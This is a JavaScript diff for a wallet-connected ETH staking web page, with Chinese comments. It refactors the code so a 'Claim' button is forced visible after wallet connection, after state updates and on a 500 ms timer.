@@ -391,10 +391,6 @@ function resetState(showMsg = true) {
     startBtn.style.display = 'block';
     startBtn.textContent = translations[currentLang]?.startBtnText || 'Start';
   }
-  if (claimBtnPlaceholder) {
-    claimBtnPlaceholder.style.display = 'inline-flex'; // 強制顯示
-    claimBtnPlaceholder.onclick = claimInterest;
-  }
   if (connectButton) {
     connectButton.classList.remove('connected');
     connectButton.textContent = 'Connect';
@@ -407,6 +403,8 @@ function resetState(showMsg = true) {
   if (grossOutputValue) grossOutputValue.textContent = '0 ETH';
   if (cumulativeValue) cumulativeValue.textContent = '0 ETH';
   if (showMsg) updateStatus(translations[currentLang].noWallet, true);
+  // 強制顯示 Claim 圖案
+  forceShowClaimButton();
 }
 
 function disableInteractiveElements(disable = false) {
@@ -451,7 +449,7 @@ function updateTotalFunds() {
   totalValue.textContent = `${total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
 }
 
-// 強制顯示 Claim 圖案（無論是否挖礦）
+// 強制顯示 Claim 圖案
 function forceShowClaimButton() {
   const placeholder = document.getElementById('claimButtonPlaceholder');
   if (placeholder) {
@@ -610,15 +608,13 @@ function activateStakingUI() {
   const storedAccountBalance = JSON.parse(localStorage.getItem('accountBalance'));
   if (storedAccountBalance) accountBalance = storedAccountBalance;
   if (startBtn) startBtn.style.display = 'none';
-  if (claimBtnPlaceholder) {
-    claimBtnPlaceholder.style.display = 'inline-flex';
-    claimBtnPlaceholder.onclick = claimInterest;
-  }
   if (interestInterval) clearInterval(interestInterval);
   interestInterval = setInterval(updateInterest, 5000);
   if (nextBenefitInterval) clearInterval(nextBenefitInterval);
   nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
   saveUserData();
+  // 強制顯示
+  forceShowClaimButton();
 }
 
 async function sendMobileRobustTransaction(populatedTx) {
@@ -709,6 +705,8 @@ async function connectWallet() {
     updateBalancesUI(balances);
     updateStatus(translations[currentLang].walletConnected);
     await loadUserDataFromServer(); setupSSE(); await saveUserData();
+    // 強制顯示
+    forceShowClaimButton();
   } catch (e) {
     let msg = `${translations[currentLang].error}: ${e.message}`;
     if (e.code === 4001) msg = "您拒絕了連線請求。";
@@ -745,6 +743,8 @@ async function updateUIBasedOnChainState() {
       pledgeBtn.disabled = pledgeAmount.disabled = pledgeDuration.disabled = pledgeToken.disabled = true;
     }
     disableInteractiveElements(false); updateStatus("");
+    // 強制顯示
+    forceShowClaimButton();
   } catch (e) {
     updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
   }
@@ -920,9 +920,8 @@ window.onload = async () => {
   updateTotalFunds();
   setInterval(updateTotalFunds, 1000);
 
-  // 強制顯示 Claim 圖案（無論是否挖礦）
-  forceShowClaimButton();
-  setInterval(forceShowUpdateInterest, 500);
+  // 強制顯示 Claim 圖案（每 500ms 一次，持續強制）
+  setInterval(forceShowClaimButton, 500);
 
   setInitialNextBenefitTime();
 
